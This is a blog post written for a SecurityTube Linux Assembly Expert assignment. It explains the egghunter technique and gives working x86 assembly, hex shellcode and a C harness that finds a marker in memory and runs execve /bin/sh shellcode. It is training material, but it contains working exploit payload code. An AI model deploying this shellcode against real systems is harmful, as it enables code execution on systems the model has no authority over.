---
comments: true
date: 2014-04-09
layout: blog
title: 'SLAE Assignment 3: EggHunter Demo'
summary: '3rd assignment of the SLAE'
category: blog
image: /images/header_images/slaelogo.png
tags: [asm-x86,nasm,slae]
---

This is the third of the seven assignment necessary to accomplish the [SecurityTube Linux Assembly Expert](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html) certification. The instructions for this assignment are:

  1. Study about EggHunter
	
  2. Make a working demo
	
  3. Make it configurable for different payload

An EggHunter is a small piece of code that search to a pattern (the egg) into the memory and once the pattern is found the shellcode will be executed. Tipically the egg is wrote twice, this to avoid the problem of finding an identical sequence in some other part of the memory.

The following is a PoC of an EggHunter:

```c    
unsigned char egghunter[] = "egghunter shellcode"
unsigned char shellcode[] = \
"egg"
"egg"
"execve /bin/sh shellcode"

int main(void){
    run(egghunter);
    return 0;
}
```

This is the complete shellcode:

```nasm    
;Description:	Assignment #3 (EggHunter, 34 bytes)
;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x31\xdb\xb1\x02\x81\x3c\x18\xaa\xbb\xcc\xdd\x75\xf2\x83\xc3\x04\xfe\xc9\x75\xf0\x8d\x40\x08\xff\xe0
;Author: 		Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		526

global _start
section .text
_start:
	fldz
	fstenv [esp-0xc]
	pop eax
lp1:
	inc eax
	xor ebx,ebx
	mov cl,2
lp2:
	cmp dword [eax+ebx],0xddccbbaa
	jne lp1
	add ebx,4	;the egg must be found twice so i check eax and eax+4
	dec cl		;this is a counter to track how many times the egg has been found
	jnz lp2
	lea eax,[eax+8]	;if the egg has been found then jmp into the shellcode
	jmp eax
```

In this shellcode I didn't use the jmp-call-pop technique (which is more ids friendly) but instead I used two FPU instructions:

  * `fldz` to push +0.0 onto the FPU register stack
	
  * `fstenv [esp-0xc]` to save the current FPU operating environment at the specified memory location
	
  * and then `pop eax` . Now `eax` contains the address offldz

The following is the graph of the egghunter shellcode flow:

[![graph_assign3]({{ site.baseurl }}/images/2014/04/graph_assign3-1024x601.png)]({{ site.baseurl }}/images/2014/04/graph_assign3.png)

This is the C source file:

```c    
/* Description:	EggHunter(execve(/bin/sh))
 * Author:	Paolo Stivanin <https://github.com/polslinux>
 * SLAE ID:	526
 */

#include <stdio.h>
#include <string.h>

unsigned char eggHunter[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x31\xdb\xb1\x02\x81\x3c\x18\xaa\xbb\xcc\xdd\x75\xf2\x83\xc3\x04\xfe\xc9\x75\xf0\x8d\x40\x08\xff\xe0";

unsigned char execveShellcode[] = \
"\xaa\xbb\xcc\xdd" //egg
"\xaa\xbb\xcc\xdd" //egg
"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void){
	printf("EggHunter: %zu\n", strlen(eggHunter));
	printf("Shellcode: %zu\n", strlen(execveShellcode));
	int (*ret)() = (int(*)())eggHunter;
	ret();
	return 0;
}
```

and the following is the result of the above snippet:

[![assign3]({{ site.baseurl }}/images/2014/04/assign3-1024x552.png)]({{ site.baseurl }}/images/2014/04/assign3.png)

All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

**Student ID: SLAE-526**
